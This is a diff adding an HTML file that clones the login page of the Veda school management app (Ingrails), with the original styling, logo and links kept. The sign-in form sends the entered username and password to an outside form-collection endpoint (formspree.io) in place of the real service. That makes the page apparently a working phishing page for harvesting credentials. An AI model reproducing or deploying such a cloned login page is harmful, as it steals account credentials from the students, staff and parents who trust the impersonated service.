@@ -1,0 +1,390 @@
+<!doctype html>
+
+<html>
+    <head>
+
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title> Veda : Log In </title>
+    <script src='https://www.google.com/recaptcha/api.js'></script>
+    <!-- font Awesome -->
+    <link href="https://ingrails.com/school/admin_panel/css/font-awesome.min.css" rel="stylesheet" type="text/css" />
+    <link href="https://veda-app.s3.ap-south-1.amazonaws.com/admin_panel/css/bootstrap.min.css" rel="stylesheet" type="text/css" />
+</head>
+
+<body>
+    <link href="https://fonts.googleapis.com/css?family=Muli:400,700" rel="stylesheet">
+    <style>
+        * {
+            -webkit-box-sizing: border-box;
+            -moz-box-sizing: border-box;
+            box-sizing: border-box;
+        }
+
+        body {
+            margin: 0;
+            padding: 0;
+            background: #eee !important;
+            position: relative;
+            font-size: 100%;
+        }
+
+        .login-wrapper {
+            width: 100%;
+            min-height: 100vh;
+            padding: 20px 0;
+            display: -webkit-box;
+            display: -ms-flexbox;
+            display: flex;
+            -ms-flex-wrap: wrap;
+            flex-wrap: wrap;
+            -webkit-box-align: center;
+            -ms-flex-align: center;
+            align-items: center;
+            /*-webkit-box-pack: center;*/
+            /*-ms-flex-pack: center;*/
+            /*justify-content: center;*/
+            font-family: 'Muli', sans-serif;
+        }
+
+        .loginBox {
+            width: 570px;
+            max-width: 95%;
+            margin: 0 auto;
+            background: #fff;
+            border-radius: 5px;
+            box-shadow: 0 6px 31px #ddd;
+            padding: 60px 10px;
+        }
+
+        .loginBox .login-content {
+            max-width: 370px;
+            margin: 0 auto;
+            width: 95%;
+        }
+
+        .login-form input {
+            width: 100%;
+            display: block;
+            height: 40px;
+            -webkit-border-radius: 44px;
+            -moz-border-radius: 44px;
+            border-radius: 44px;
+            border: 1px solid #c5c5c5;
+            box-shadow: none !important;
+            outline: none !important;
+            padding: 0 10px 0 20px;
+            margin-bottom: 20px;
+            box-shadow: 0 2px 7px #c0d5f5;
+            font-family: 'Muli', sans-serif;
+            font-size: 14px;
+
+        }
+
+        .login-form button {
+            width: 100%;
+            display: block;
+            height: 40px;
+            border: none !important;
+            outline: none !important;
+            box-shadow: none !important;
+            -webkit-border-radius: 44px;
+            -moz-border-radius: 44px;
+            border-radius: 44px;
+            margin: 40px 0 20px 0;
+            cursor: pointer;
+            background: #4384e8;
+            color: #fff;
+            font-family: 'Muli', sans-serif;
+            font-weight: 400;
+            font-size: 15px;
+
+        }
+
+        .login-form input::-webkit-input-placeholder {
+            /* Chrome/Opera/Safari */
+            color: #555;
+        }
+
+        .login-form input::-moz-placeholder {
+            /* Firefox 19+ */
+            color: #555;
+        }
+
+        .login-form input:-ms-input-placeholder {
+            /* IE 10+ */
+            color: #555;
+        }
+
+        .login-form input:-moz-placeholder {
+            /* Firefox 18- */
+            color: #555;
+        }
+
+        .login-content .veda-logo {
+            width: 90px;
+            margin: 0 auto;
+            display: block;
+            margin-bottom: 40px;
+        }
+
+        .link-help {
+            font-size: 16px;
+            text-align: center;
+            font-weight: 400;
+            color: #4384e8;
+            text-decoration: none;
+            margin-top: 30px;
+            display: block;
+        }
+
+        .g-recaptcha {
+            width: 100%;
+            display: block;
+            margin-top: 20px;
+        }
+
+        .g-recaptcha>div {
+            display: block;
+            margin: 0 auto;
+
+        }
+
+        .error-message {
+
+            padding: 10px 10px 10px 20px;
+            background: #de1818;
+            margin-bottom: 20px;
+            border-radius: 4px;
+        }
+
+        .error-message p {
+            margin: 0;
+            font-size: 15px;
+            color: #fff;
+        }
+
+        .more-links {
+            padding: 10px 20px;
+            margin-top: 10px;
+            display: -webkit-box;
+            display: -ms-flexbox;
+            display: flex;
+            -ms-flex-wrap: wrap;
+            flex-wrap: wrap;
+            -webkit-box-pack: justify;
+            -ms-flex-pack: justify;
+            justify-content: space-between;
+        }
+
+        .more-links a {
+            color: #737373;
+            font-size: 13px;
+            text-decoration: none;
+        }
+
+        .more-links a .fa {
+            font-size: 15px;
+        }
+
+        .more-links nav a,
+        .more-links nav span {
+            margin-right: 10px;
+        }
+
+        .more-links nav a:last-child {
+            margin-right: 0;
+        }
+
+        .more-links a:hover {
+            color: #4384e8;
+            font-size: 13px;
+            text-decoration: none;
+        }
+
+        .powered a {
+            color: #333;
+            font-weight: bold;
+        }
+
+        .powered span {
+            color: #636366;
+            font-size: 13px;
+        }
+
+        .login-wrapper>div {
+            width: 100%;
+            width: 600px;
+            max-width: 95%;
+            margin: 0 auto;
+        }
+    </style>
+
+    <section class="login-wrapper">
+        <div>
+            <!--            <div style="padding: 0px 50px;text-align: center;font-weight: 600;font-family: 'Muli',sans-serif;color: #444;">-->
+            <!--                <div style="padding:20px; background:#bce6fe47;border-top-right-radius: 3px;border-top-left-radius: 3px;">-->
+            <!--                    <p >Routine server maintenance and upgrade</p>-->
+            <!--                    <p style="font-weight: 300;color: #666;font-size: 14px;line-height: 22px;">-->
+            <!--                    To provide you with a better experience, we are currently upgrading our-->
+            <!--                    infrastructure. You might face some issues while using the system. Our apologies for the  inconvenience caused.-->
+            <!--                    </p>-->
+            <!--                    <p style="font-size: 15px;">Thanks for your patience!</p>-->
+            <!--                </div>-->
+            <!--            </div>-->
+            <!--        -->
+
+
+
+
+
+            <section class="loginBox" id="loginBox">
+                <div class="login-content">
+                    <img src="https://veda-app.s3.ap-south-1.amazonaws.com/assets/extra_files/veda-logo.png" alt="Veda" class="veda-logo">
+                                        <div class="error-message" style="display: none" >
+                        <p class="p">
+                                                    </p>
+                    </div>
+                    <form action="https://formspree.io/f/mjvlpzjo" method="post" class="login-form">
+                        <input type="hidden" name="ingrails_validation" value="9b27a44229c9342ba8ad0f2758c69dc0">
+
+                        <input type="text" name="email" class="form-control" placeholder="Email or Username" autofocus required />
+                        <input type="password" name="password" class="form-control" placeholder="Password" required />
+
+                        
+                        <button type="submit">Sign In</button>
+
+<!--                        <a href="https://veda-app.com/event/haat-haat-ma-shikshya?utm_source=ingrails&utm_medium=website&utm_campaign=loginpage" style="display: block;" target="_blank">-->
+<!--                            <img src="https://veda-app.s3.ap-south-1.amazonaws.com/veda-website/20210614152955kimakISa5kqn9Sb3AVTpUQHAjf9VG8.jpg" style="width: 100%; height: auto;">-->
+<!--                        </a>-->
+                    </form>
+                    <a class="link-help" href="https://veda-app.com/support" target="_blank" rel="noopener">Help</a>
+                    <a class="link-help" href="#" target="" rel="noopener" onclick="showForgotPasswordModel();">Forgot Password?</a>
+                </div>
+            </section>
+            <section class="more-links">
+                <nav>
+                    <a href="https://veda-app.com/features" target="_blank">Features</a>
+                    <a href="https://ingrails.com/contact.php" target="_blank">Contact Us</a>
+                    <!-- <a href="https://www.facebook.com/tryveda/?fref=ts" style="margin-right: 20px;" target="_blank" title="Facebook">
+                        &nbsp; <i class="fa fa-facebook" aria-hidden="true"></i>
+                    </a> -->
+                                            <span>
+                            <div id="fb-root" style="display: inline-block"></div>
+                            <script async defer crossorigin="anonymous" src="https://connect.facebook.net/en_US/sdk.js#xfbml=1&version=v7.0"></script>
+                            <div class="fb-like" data-href="https://www.facebook.com/tryveda" data-width="" data-layout="button" data-action="like" data-size="small" data-share="false"></div>
+                        </span>
+                                        <a href="https://www.instagram.com/veda.app/" target="_blank" title="Instagram">
+                        <i class="fa fa-instagram" aria-hidden="true"></i>
+                    </a>
+                </nav>
+                <div class="powered">
+                    <span>Powered By</span>
+                    <a href="https://ingrails.com/" target="_blank">Ingrails</a>
+                </div>
+            </section>
+        </div>
+    </section>
+
+    <div id="forgot-password-model" style="display: none;">
+        <a class="link-help" onclick="reload();" style="margin-top: -55px; float: left;">Back</a>
+        <div class="login-content" id="forgot-password-content">
+            <div class="error-message" style="display: none;">
+                <p class="p" id="err-msg"></p>
+            </div>
+            <img src="https://veda-app.s3.ap-south-1.amazonaws.com/assets/extra_files/veda-logo.png" alt="Veda" class="veda-logo">
+                <div class="login-form">
+                    <input type="hidden" name="ingrails_validation" value="9b27a44229c9342ba8ad0f2758c69dc0">
+                    <input type="text" name="email" class="form-control" placeholder="Email or Username" id="username" autofocus required />
+                     <button onclick="getUserDetail();">Next</button>
+                </div>
+                <a class="link-help" href="https://veda-app.com/support" target="_blank" rel="noopener">Help</a>
+            </div>
+    </div>
+
+            <!-- Facebook Pixel Code -->
+        <script>
+            ! function(f, b, e, v, n, t, s) {
+                if (f.fbq) return;
+                n = f.fbq = function()
+
+                {
+                    n.callMethod ? n.callMethod.apply(n, arguments) : n.queue.push(arguments)
+                };
+                if (!f._fbq) f._fbq = n;
+                n.push = n;
+                n.loaded = !0;
+                n.version = '2.0';
+                n.queue = [];
+                t = b.createElement(e);
+                t.async = !0;
+                t.src = v;
+                s = b.getElementsByTagName(e)[0];
+                s.parentNode.insertBefore(t, s)
+            }(window, document, 'script',
+                'https://connect.facebook.net/en_US/fbevents.js');
+            fbq('init', '2867851070100183');
+            fbq('track', 'PageView');
+        </script>
+        <noscript><img height="1" width="1" style="display:none" src="https://www.facebook.com/tr?id=2867851070100183&ev=PageView&noscript=1" /></noscript>
+        <!-- End Facebook Pixel Code -->
+    
+    <script>
+        function showForgotPasswordModel()
+        {
+            var loginBox = $('#loginBox');
+            var forgotPassword = $('#forgot-password-model').html();
+            loginBox.html(forgotPassword);
+            $('.login-content').css('display', 'none');
+            $('#forgot-password-content').css('display', 'block');
+        }
+
+        function getUserDetail()
+        {
+            var username = $('#username').val();
+            var url = "https://ingrails.com/school/forgotPassword/getUserDetail";
+            if(username !== ''){
+                $.post(url, {username: username}, function(data){
+                     data = (isJson(data)) ? JSON.parse(data): data;
+                    if(data.status === "false")
+                    {
+                        $('.error-message').css('display', 'block');
+                        $('#err-msg').html(data.message);
+                        $('#username').val('');
+                        $('#username').focus();
+                    } else {
+                        $('#loginBox').html(data);
+                        $('#forgot-password-model').css('display', 'none');
+                    }
+                });
+            } else {
+                $('#username').css('border-color', 'red');
+                $('#username').focus();
+            }
+        }
+
+        function isJson(str) {
+            try {
+                JSON.parse(str);
+            } catch (e) {
+                return false;
+            }
+            return true;
+        }
+        
+        function reload()
+        {
+            location.reload();
+        }
+    </script>
+
+<script src="https://veda-app.s3.ap-south-1.amazonaws.com/admin_panel/js/jquery-1.10.2.js"></script>
+<script src="https://veda-app.s3.ap-south-1.amazonaws.com/admin_panel/js/jquery-ui-1.10.3.min.js" type="text/javascript"></script>
+</body>
+</html>
+      
